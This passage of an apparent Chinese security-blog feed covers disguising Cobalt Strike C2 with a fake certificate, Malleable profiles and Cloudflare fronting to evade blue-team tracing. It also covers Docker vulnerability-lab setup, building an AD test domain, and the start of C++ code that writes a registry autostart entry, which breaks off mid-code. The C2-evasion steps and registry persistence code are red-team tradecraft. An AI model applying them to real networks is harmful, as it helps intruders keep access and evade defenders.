title="修改证书"></a>修改证书</h3><p>&nbsp;&nbsp;修改自带的cobaltStrike.store证书，先删除cobaltStrike.store文件，后续编写teamserver文件,将原本在这个位置的那句话删掉修改为如下内容</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -keystore cobaltstrike.store -storepass <span class="number">123456</span> -keypass <span class="number">123456</span> -genkey -keyalg RSA -alias http:<span class="comment">//google.com -dname "CN=US, OU=google.com, O=Sofaware, L=Somewhere, ST=Cyberspace, C=CN"</span></span><br></pre></td></tr></table></figure><p><img src="12.png" alt=""></p><p>&nbsp;&nbsp;修改完后，下次运行teamserver文件时会自动生成新的cobaltStrike.store文件</p><h3 id="cs运行"><a href="#cs运行" class="headerlink" title="cs运行"></a>cs运行</h3><p>&nbsp;&nbsp;配置完规则后，运行CS，加载profile文件</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver <span class="symbol">x</span>.<span class="symbol">x</span>.<span class="symbol">x</span>.<span class="symbol">x</span> ****** cs.profile</span><br></pre></td></tr></table></figure><p><img src="14.png" alt=""></p><p>&nbsp;&nbsp;new一个新的Listener<br><br>&nbsp;&nbsp;这边需要注意Cloudflare只支持监听以下端口：<br></p><ul><li>HTTP端口：80,8080,8880,2052,2082,2086,2095</li><li>HTTPs端口：443,2053,2083,2087,2096,8443</li><li>注意：如果VPS是国内云主机，且注册的免费域名没有备案，则不能使用80、8080、443、8443端口提供服务，否则会被拦截提示备案才能访问。</li></ul><p><img src="15.png" alt=""></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>直接访问显示不存在 404，可以正常上线<br><img src="16.png" alt=""></p><p><img src="17.png" alt=""></p><h3 id="profile方面"><a href="#profile方面" class="headerlink" title="profile方面"></a>profile方面</h3><p>profile方面复杂的可以用github上面的收集了几个好用的Malleable-C2，还有挺多的，可以在github上搜搜</p><p><a href="https://github.com/rsmudge/Malleable-C2-Profiles" target="_blank" rel="noopener">Malleable-C2-Profiles</a><br><br><a href="https://github.com/threatexpress/malleable-c2" target="_blank" rel="noopener">malleable-c2</a><br><br><a href="https://github.com/FortyNorthSecurity/C2concealer" target="_blank" rel="noopener">C2concealer</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;简述&quot;&gt;&lt;a href=&quot;#简述&quot; class=&quot;headerlink&quot; title=&quot;简述&quot;&gt;&lt;/a&gt;简述&lt;/h2&gt;&lt;p&gt;CS的流量特征是很明显的，如果蓝队成员在流量中发现了相关特征那么基本也就宣告了个权限的丢失，而且还有可能被疏远反制。正因为CS的流量的特征太明显，所以需要对CS进行一些修改和对VPS的地址进行保护，尽可以降低被发现后造成权限丢失和被溯源反制的事情发生概率，加大蓝队的疏远难度。&lt;br&gt;主要思路&lt;/p&gt;</summary>
    
    
    
    <category term="域前置" scheme="https://chenzidu.github.io/categories/%E5%9F%9F%E5%89%8D%E7%BD%AE/"/>
    
    
    <category term="Windows" scheme="https://chenzidu.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>docker搭建</title>
    <link href="https://chenzidu.github.io/2022/04/17/docker%E6%90%AD%E5%BB%BA/"/>
    <id>https://chenzidu.github.io/2022/04/17/docker%E6%90%AD%E5%BB%BA/</id>
    <published>2022-04-17T14:52:40.000Z</published>
    <updated>2022-12-11T09:31:21.954Z</updated>
    
    <content type="html"><![CDATA[<p><a name="MRO41"></a></p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p><a name="JGWFo"></a></p><h3 id="本地为centos8（已停止维护）"><a href="#本地为centos8（已停止维护）" class="headerlink" title="本地为centos8（已停止维护）"></a>本地为centos8（已停止维护）</h3><p><a name="DpgRB"></a></p><h3 id="1、换华为源（阿里云源也停止维护了）"><a href="#1、换华为源（阿里云源也停止维护了）" class="headerlink" title="1、换华为源（阿里云源也停止维护了）"></a>1、换华为源（阿里云源也停止维护了）</h3><a id="more"></a><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">下载新源</span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-<span class="module-access"><span class="module"><span class="identifier">Base</span>.</span></span>repo https:<span class="comment">//repo.huaweicloud.com/repository/conf/CentOS-8-reg.repo</span></span><br><span class="line"></span><br><span class="line">AppStream源，移除可直接删除或者，改为备份文件</span><br><span class="line">mv CentOS-Linux-<span class="module-access"><span class="module"><span class="identifier">AppStream</span>.</span></span>repo  CentOS-Linux-<span class="module-access"><span class="module"><span class="identifier">AppStream</span>.</span></span>repo.bak</span><br><span class="line"></span><br><span class="line">BaseOS源同样，移除可直接删除或者，改为备份文件</span><br><span class="line">mv CentOS-Linux-<span class="module-access"><span class="module"><span class="identifier">BaseOS</span>.</span></span>repo CentOS-Linux-<span class="module-access"><span class="module"><span class="identifier">BaseOS</span>.</span></span>repo.bak</span><br><span class="line"></span><br><span class="line">清除原有源缓存并生成新源缓存</span><br><span class="line">yum clean all<span class="operator"> &amp;&amp; </span>yum makecache</span><br></pre></td></tr></table></figure><p><a name="gM6Zw"></a></p><h3 id="2、yum包更新（可以忽略）"><a href="#2、yum包更新（可以忽略）" class="headerlink" title="2、yum包更新（可以忽略）"></a>2、yum包更新（可以忽略）</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">yum update</span></span><br></pre></td></tr></table></figure><p><a name="Ej3n5"></a></p><h3 id="3、安装需要的软件包，-yum-util-提供yum-config-manager功能，另外两个是devicemapper驱动依赖的"><a href="#3、安装需要的软件包，-yum-util-提供yum-config-manager功能，另外两个是devicemapper驱动依赖的" class="headerlink" title="3、安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的"></a>3、安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的</h3><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -<span class="symbol">y</span> yum-utils device-mapper-<span class="symbol">persistent</span>-data lvm2</span><br></pre></td></tr></table></figure><p><a name="zNViO"></a></p><h3 id="4、配置阿里云的docker仓库"><a href="#4、配置阿里云的docker仓库" class="headerlink" title="4、配置阿里云的docker仓库"></a>4、配置阿里云的docker仓库</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum-config-manager --<span class="built_in">add</span>-repo http<span class="variable">s:</span>//mirrors.aliyun.<span class="keyword">com</span>/docker-<span class="keyword">ce</span>/linux/centos/docker-<span class="keyword">ce</span>.repo</span><br><span class="line"></span><br><span class="line">dnf install http<span class="variable">s:</span>//mirrors.aliyun.<span class="keyword">com</span>/docker-<span class="keyword">ce</span>/linux/centos/<span class="number">7</span>/x86_64/stable/Packages/containerd.io-<span class="number">1.2</span>.<span class="number">13</span>-<span class="number">3.1</span>.el7.x86_64.rpm</span><br><span class="line"></span><br><span class="line">dnf install docker-<span class="keyword">ce</span></span><br></pre></td></tr></table></figure><p><a name="INkDZ"></a></p><h3 id="5、下载docker-ce的repo"><a href="#5、下载docker-ce的repo" class="headerlink" title="5、下载docker-ce的repo"></a>5、下载docker-ce的repo</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http<span class="variable">s:</span>//download.docker.<span class="keyword">com</span>/linux/centos/docker-<span class="keyword">ce</span>.repo -<span class="keyword">o</span> /etc/yum.repos.d/docker-<span class="keyword">ce</span>.repo</span><br><span class="line"></span><br><span class="line">dnf -<span class="keyword">y</span>  install docker-<span class="keyword">ce</span>  docker-<span class="keyword">ce</span>-cli --nobest</span><br></pre></td></tr></table></figure><p>6、启动docker</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="literal">start</span> docker</span><br></pre></td></tr></table></figure><p>7、安装docker-comper</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip <span class="keyword">install</span> docker-compose</span><br></pre></td></tr></table></figure><p><a name="ELKcB"></a></p><h2 id="操作基本镜像"><a href="#操作基本镜像" class="headerlink" title="操作基本镜像"></a>操作基本镜像</h2><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">拉取，例如ubuntu</span></span><br><span class="line"><span class="attr">docker</span> <span class="string">pull ubuntu</span></span><br><span class="line"></span><br><span class="line"><span class="attr">查看当前存在的镜像</span></span><br><span class="line"><span class="attr">docker</span> <span class="string">images</span></span><br><span class="line"></span><br><span class="line"><span class="attr">运行镜像</span></span><br><span class="line"><span class="attr">docker</span> <span class="string">run &lt;IMAGE ID&gt;    镜像ID不一定要全部，部分也行</span></span><br><span class="line"></span><br><span class="line"><span class="attr">docker</span> <span class="string">ps -a 查看运行状态</span></span><br></pre></td></tr></table></figure><p><a name="rPju1"></a></p><h2 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker-compose安装</span><br><span class="line">sudo curl -L <span class="string">"https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)"</span> -o <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>docker-compose</span><br><span class="line"></span><br><span class="line">二进制文件应用可执行权限</span><br><span class="line">sudo chmod +x <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>docker-compose</span><br></pre></td></tr></table></figure><p>将容器弄成靶机后，需要将容器暂停，再打包成镜像<br><a name="Xolyh"></a></p><h3 id="docker中创建储存库"><a href="#docker中创建储存库" class="headerlink" title="docker中创建储存库"></a>docker中创建储存库</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1649240159389-79318a66-3b79-4004-b9f8-51436a129e54.png#clientId=ua091ed00-979a-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=650&id=JaGIw&margin=%5Bobject%20Object%5D&name=image.png&originHeight=975&originWidth=2363&originalType=binary&ratio=1&rotation=0&showTitle=false&size=131388&status=done&style=none&taskId=uafc26856-b1af-4de3-a4b0-38d8886079d&title=&width=1575.3333333333333" alt="image.png"><br><a name="GbR9r"></a></p><h2 id="打包镜像"><a href="#打包镜像" class="headerlink" title="打包镜像"></a>打包镜像</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">暂停容器</span><br><span class="line">docker <span class="keyword">stop</span> &lt;<span class="keyword">CONTAINER</span> <span class="keyword">ID</span>&gt;</span><br><span class="line"></span><br><span class="line">打包成镜像</span><br><span class="line">docker <span class="keyword">commit</span> -a <span class="string">"xx"</span> -m <span class="string">"xxxx"</span> &lt;<span class="keyword">CONTAINER</span> <span class="keyword">ID</span>&gt; &lt;docker账户名称/存储库:latest&gt;</span><br><span class="line">-a 提交的镜像作者</span><br><span class="line">-m 提交时的说明文字</span><br><span class="line">docker <span class="keyword">commit</span> -a <span class="string">"z1du"</span> -m <span class="string">"test"</span> <span class="number">4</span>cb57b89fc93  docker账户名称/ubuntutest:latest</span><br></pre></td></tr></table></figure><p><a name="aDEp8"></a></p><h3 id="docker-登录"><a href="#docker-登录" class="headerlink" title="docker 登录"></a>docker 登录</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在机器上登录docker账号</span><br><span class="line">docker <span class="keyword">login</span></span><br></pre></td></tr></table></figure><p><a name="b9HlG"></a></p><h2 id="上传镜像"><a href="#上传镜像" class="headerlink" title="上传镜像"></a>上传镜像</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">docker</span> <span class="keyword">push </span>docker账户名称/ubuntutest</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1649240898090-7ac77c37-7c51-4297-a543-2216e4f48d8e.png#clientId=ua091ed00-979a-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=847&id=ue5abb09a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1271&originWidth=1958&originalType=binary&ratio=1&rotation=0&showTitle=false&size=180303&status=done&style=none&taskId=u5113da0e-d9a6-4fc8-9a87-c30e7169dec&title=&width=1305.3333333333333" alt="image.png"><br><a name="syD5b"></a></p><h2 id="docker-compose-yml文件编写"><a href="#docker-compose-yml文件编写" class="headerlink" title="docker-compose.yml文件编写"></a>docker-compose.yml文件编写</h2><p>上传完后可以编写一个简单的docker-compose.yml文件，方便别人拉取你的镜像来进行漏洞复现。详细的可以看官方文档(<a href="https://docs.docker.com/compose/" target="_blank" rel="noopener">https://docs.docker.com/compose/</a>)</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">version:</span> <span class="string">'2'</span></span><br><span class="line"><span class="symbol">services:</span></span><br><span class="line"><span class="symbol"> weblogic:</span></span><br><span class="line"><span class="symbol">   image:</span> z1du/weblogic12214jdk8u181</span><br><span class="line"><span class="symbol">   ports:</span></span><br><span class="line">    - <span class="string">"7001:7001"</span></span><br></pre></td></tr></table></figure><p>通过docker-compose构建靶机环境</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">docker</span>-compose <span class="keyword">build </span></span><br><span class="line"><span class="symbol">docker</span>-compose up -d</span><br></pre></td></tr></table></figure><p><a name="F93L9"></a></p><h2 id="可能遇到的问题"><a href="#可能遇到的问题" class="headerlink" title="可能遇到的问题"></a>可能遇到的问题</h2><p>如果遇到上传不上去，一直失败，建议用代理，或者换源。可能是太大了上传时间太久，导致的问题</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a name=&quot;MRO41&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置&quot;&gt;&lt;/a&gt;环境配置&lt;/h2&gt;&lt;p&gt;&lt;a name=&quot;JGWFo&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;本地为centos8（已停止维护）&quot;&gt;&lt;a href=&quot;#本地为centos8（已停止维护）&quot; class=&quot;headerlink&quot; title=&quot;本地为centos8（已停止维护）&quot;&gt;&lt;/a&gt;本地为centos8（已停止维护）&lt;/h3&gt;&lt;p&gt;&lt;a name=&quot;DpgRB&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;1、换华为源（阿里云源也停止维护了）&quot;&gt;&lt;a href=&quot;#1、换华为源（阿里云源也停止维护了）&quot; class=&quot;headerlink&quot; title=&quot;1、换华为源（阿里云源也停止维护了）&quot;&gt;&lt;/a&gt;1、换华为源（阿里云源也停止维护了）&lt;/h3&gt;</summary>
    
    
    
    <category term="漏洞环境" scheme="https://chenzidu.github.io/categories/%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/"/>
    
    
    <category term="Docker" scheme="https://chenzidu.github.io/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>搭建域环境(小)</title>
    <link href="https://chenzidu.github.io/2022/03/15/%E6%90%AD%E5%BB%BA%E5%9F%9F%E7%8E%AF%E5%A2%83/"/>
    <id>https://chenzidu.github.io/2022/03/15/%E6%90%AD%E5%BB%BA%E5%9F%9F%E7%8E%AF%E5%A2%83/</id>
    <published>2022-03-15T01:20:47.000Z</published>
    <updated>2022-12-11T09:31:21.954Z</updated>
    
    <content type="html"><![CDATA[<p>搭建域环境机器选择：<br>域控：Windows_server_2008_r2<br>域服务器：Windows_server_2012<br>PC机器：win7、winXP<br>推荐几个Windows Server 2008 R2镜像下载地址：</p><ul><li><a href="https://www.cnblogs.com/waw/p/4588629.html" target="_blank" rel="noopener">https://www.cnblogs.com/waw/p/4588629.html</a></li><li><a href="https://msdn.itellyou.cn/" target="_blank" rel="noopener">https://msdn.itellyou.cn/</a></li><li><a href="https://pan.baidu.com/s/1yaN_tRjaGVUCNIAaOGx8gA" target="_blank" rel="noopener">https://pan.baidu.com/s/1yaN_tRjaGVUCNIAaOGx8gA</a> 提取码：izny</li></ul><a id="more"></a><h2 id="配置AD域服务"><a href="#配置AD域服务" class="headerlink" title="配置AD域服务"></a>配置AD域服务</h2><p>下载好镜像后,添加至VM中开始安装。我这边给域控分配的是2G内存，30G储存。</p><p>选择Windows Server 2008 R2 Standard(完全安装)</p><p><img src="1.jpg" alt=""></p><p>选择自定义(高级)</p><p><img src="2.jpg" alt=""></p><p>点击下一步</p><p><img src="3.jpg" alt=""></p><p>等待安装</p><p><img src="4.jpg" alt=""></p><p>设置完账号密码后登陆，选择添加角色，选择安装Active Directory 域服务即可</p><p><img src="AD%E5%9F%9F%E6%9C%8D%E5%8A%A1.jpg" alt=""></p><p>添加域名，尽量不要和经常使用的重合= =</p><p><img src="5.jpg" alt=""></p><p>下一步</p><p><img src="6.jpg" alt=""></p><p>DNS服务器安装</p><p><img src="7.jpg" alt=""></p><p>是</p><p><img src="8.jpg" alt=""></p><p>配置IP，这台机器的IP是192.168.71.137，192.168.71.2的是VM的网关，配置完后域控就配置完了</p><p><img src="9.jpg" alt=""></p><h2 id="配置win7-pc机器"><a href="#配置win7-pc机器" class="headerlink" title="配置win7 pc机器"></a>配置win7 pc机器</h2><p>配置PC win7的网络，备选DNS记得选上VM的，免得域控没开，机器不能出网</p><p><img src="10.jpg" alt=""></p><p>在域控中查找Active Directory 用户和计算机-&gt;users-&gt;新建-&gt;用户</p><p><img src="11.jpg" alt=""></p><p>将域用户信息填入。</p><p><img src="12.jpg" alt=""></p><p>此计算机-&gt;属性-&gt;系统属性-&gt;计算机名/域更改-&gt;选择域，填入域名，之后登陆刚刚添加的域用户账号，弹出欢迎加入域，即配置成功</p><p><img src="13.jpg" alt=""></p><p>遇到XP客户机加入域的问题：加入域显示不能访问网络位置。<br>要解决此问题，请启动 TCP/IP NetBIOS 支持服务，然后加入域。<br>要启动 NetBIOS 支持服务，请按照下列步骤操作：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 使用具有管理员权限的帐户登录到客户机。</span><br><span class="line">2. 单击“开始”，单击“运行”，在“打开”框中键入 services.msc，然后单击“确定”。</span><br><span class="line">3. 在服务列表中，双击“TCP<span class="built_in">/IP </span>NetBIOS Helper Service”。</span><br><span class="line">4. 在“启动类型”列表中，单击“自动”，然后单击“应用”。</span><br><span class="line">5. 在“服务状态”下，单击“启动”以启动 TCP<span class="built_in">/IP </span>NetBIOS 支持服务。</span><br><span class="line">6. 当该服务启动后，请单击“确定”，然后退出“服务”管理单元。</span><br></pre></td></tr></table></figure><p><img src="14.jpg" alt=""></p><p>然后继续配置域名，登陆域账号，即可加入成功</p><p><img src="15.jpg" alt=""></p><p>剩下的机器按照以上配置即可，逐个加入域</p><h2 id="参考材料"><a href="#参考材料" class="headerlink" title="参考材料"></a>参考材料</h2><p><a href="http://blog.sina.com.cn/s/blog_625999850102vpqa.html" target="_blank" rel="noopener">XP客户机加入域的问题</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;搭建域环境机器选择：&lt;br&gt;域控：Windows_server_2008_r2&lt;br&gt;域服务器：Windows_server_2012&lt;br&gt;PC机器：win7、winXP&lt;br&gt;推荐几个Windows Server 2008 R2镜像下载地址：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/waw/p/4588629.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.cnblogs.com/waw/p/4588629.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://msdn.itellyou.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://msdn.itellyou.cn/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://pan.baidu.com/s/1yaN_tRjaGVUCNIAaOGx8gA&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://pan.baidu.com/s/1yaN_tRjaGVUCNIAaOGx8gA&lt;/a&gt; 提取码：izny&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="域控安装" scheme="https://chenzidu.github.io/categories/%E5%9F%9F%E6%8E%A7%E5%AE%89%E8%A3%85/"/>
    
    
    <category term="Windows" scheme="https://chenzidu.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>C++提权的几种方式(win)(二)</title>
    <link href="https://chenzidu.github.io/2022/02/10/C-%E6%8F%90%E6%9D%83%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-win-%E4%BA%8C/"/>
    <id>https://chenzidu.github.io/2022/02/10/C-%E6%8F%90%E6%9D%83%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F-win-%E4%BA%8C/</id>
    <published>2022-02-10T01:32:28.000Z</published>
    <updated>2022-12-11T09:31:21.953Z</updated>
    
    <content type="html"><![CDATA[<p>书接上回嘿嘿</p><a id="more"></a><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><p><b>Q：注册表是什么?</b></p><p>A：注册表实际上是一个管理配置系统运行参数的核心数据库，它记录了安装软件与运行程序的关联关系，计算机的硬件配置等信息。可以说计算机上所有针对硬件、软件、网络的操作都是源于注册表的。可以使用 regedit.exe 这个系统提供的注册表编辑器去管理编辑注册表。</p><hr><h1 id="C-写入注册表启动项"><a href="#C-写入注册表启动项" class="headerlink" title="C++ 写入注册表启动项"></a>C++ 写入注册表启动项</h1><p><b>注意：需要重启才能重新加载注册表，这边写入的是开机自启动的注册表，代码中的刷新功能没成功（还有别的刷新注册表的方式，这边没有再去做其他尝试）。并且需要注意64与32位注册表的不同。</b></p><blockquote><p>以下尝试的几种刷新方法：</p></blockquote><ul><li>SendMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0); //利用消息发送函数向WINDOWS发送刷新注册表的消息</li><li>PostMessage(HWND_BROADCAST, WM_COMMAND, 41504, NULL); //模拟F5刷新</li><li>SystemParametersInfo(SPI_SETCURSORS, 0, NULL, SPIF_SENDCHANGE); //通过给第一个参数传入一个SET属性的参数可以实现部分系统刷新功能</li><li>SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, (LPARAM)L”Environment”, SMTO_ABORTIFHUNG, 3000, NULL); ////通知所有打开的程序注册表已修改</li></ul><blockquote><p>SendMessageTimeout与SendMessage有什么不同？</p></blockquote><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">SendMessage</span> : 如果指定窗口由调用线程创建，那么窗口过程会被当成一个子程序立即调用。如果指定窗口由另外一个线程创建，那么系统会切换到那个线程，并且调用合适的窗口过程。在线程之间传递的消息仅仅当接收线程执行<span class="variable">message</span> <span class="variable">retrieval</span> <span class="variable">code</span>才会被处理。发送线程会被堵塞直到接收线程处理完消息。但是，发送线程在等待的同时会处理收到的<span class="variable">nonqueued</span> <span class="variable">messages</span>。为了阻止这一点，使用带有<span class="variable">SMTO_BLOCK</span>参数的<span class="variable">SendMessageTimeout</span>。</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">SendMessage</span>()在目标线程从其消息队列中检索到消息，然后以完整或调用的方式处理消息之前，不会退出<span class="title">ReplyMessage</span>()释放<span class="title">SendMessage</span>()同时继续处理消息。所以，如果<span class="title">SendMessage</span>()它意味着目标线程没有处理它的消息队列，这很好地表明目标线程可能在等待其他消息时处于死锁状态。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">使用<span class="title">SendMessageTimeOut</span>()，我们可以设置一个等待时间。一般情况下，这个消息应该会在这个时间会返回，但异常情况就通过这个<span class="variable">TIME</span>来帮助我们返回，从而知道对象的线程挂起而避免自己被挂起。</span></span><br></pre></td></tr></table></figure><p><b>64位的</b></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable : 4996)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">regedit</span><span class="params">(HKEY key, <span class="keyword">const</span> <span class="keyword">char</span>* reg_name, <span class="keyword">const</span> <span class="keyword">char</span>* key_name, <span class="keyword">const</span> <span class="keyword">char</span>* key_value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HKEY hkResult;</span><br><span class="line"><span class="keyword">int</span> ret = RegOpenKeyEx(key, reg_name, <span class="number">0</span>, KEY_ALL_ACCESS, &amp;hkResult);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">ret = RegSetValueEx(hkResult, key_name, <span class="number">0</span>, REG_EXPAND_SZ, (CONST BYTE*)key_value, <span class="number">100</span>);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">RegCloseKey(hkResult);</span><br><span class="line">SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, <span class="number">0</span>, (LPARAM)<span class="string">L"Environment"</span>, SMTO_ABORTIFHUNG, <span class="number">3000</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//下面是刷新的几种方法，都没成功</span></span><br><span class="line">        <span class="comment">//SendMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, 0);</span></span><br><span class="line"><span class="comment">//PostMessage(HWND_BROADCAST, WM_COMMAND, 41504, NULL);</span></span><br><span class="line"><span class="comment">//SystemParametersInfo(SPI_SETCURSORS, 0, NULL, SPIF_SENDCHANGE);</span></span><br><span class="line"><span class="comment">//SystemParametersInfo(SPI_SETANIMATION, sizeof(ANIMATIONINFO), &amp;info, SPIF_SENDCHANGE);</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 